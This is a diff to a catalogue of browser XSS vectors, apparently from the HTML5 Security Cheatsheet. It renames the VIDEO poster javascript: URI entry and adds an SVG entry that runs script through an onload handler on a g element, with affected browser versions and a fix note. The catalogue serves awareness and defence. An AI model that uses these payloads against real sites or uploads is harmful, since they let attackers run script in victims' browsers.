@@ -149,10 +149,10 @@ var items =
         'tags'       : ['xss', 'css', 'link-source', 'opera'],
         'reporter'   : '.mario'
     },
-    { /* ID 10 - JavaScript execution via VIDEO poster attribute  */
+    { /* ID 10 - JavaScript execution via <VIDEO> poster attribute  */
         'id'         : 10, 
         'category'   : 'html5', 
-        'name'       : 'JavaScript execution via VIDEO poster attribute',
+        'name'       : 'JavaScript execution via <VIDEO> poster attribute',
         'data'       : '<video poster=%js_uri_alert%//',
         'description': 'Opera 10.5+ allows using poster attrubtes in combination with javascript: URIs',
         'tickets'    : [],
@@ -163,6 +163,28 @@ var items =
             ]
         },
         'tags'       : ['xss', 'poster', 'video', 'opera', 'html5'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 11 - SVG executing JavaScript via G tag and onload attribute  */
+        'id'         : 11, 
+        'category'   : 'svg', 
+        'name'       : 'SVG executing JavaScript via <G> tag and onload attribute',
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg"><g onload="%js_uri_alert%"></g></svg>',
+        'description': 'SVG files can execute JavaScript via onload events on any element without user interaction',
+        'tickets'    : [],
+        'howtofix'   : 'SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbirary HTML data as well as event handlers in native elements',            
+        'browsers'   : {
+            'opera': [
+                '10.0', '10.5'
+            ],
+            'chrome': [
+                '4.0', '5.5'
+            ],
+            'firefox': [
+                '3.0', '3.5', '3.7', '3.7'
+            ]            
+        },
+        'tags'       : ['xss', 'svg', 'onload', 'opera', 'firefox', 'chrome'],
         'reporter'   : '.mario'
     } 
 ]
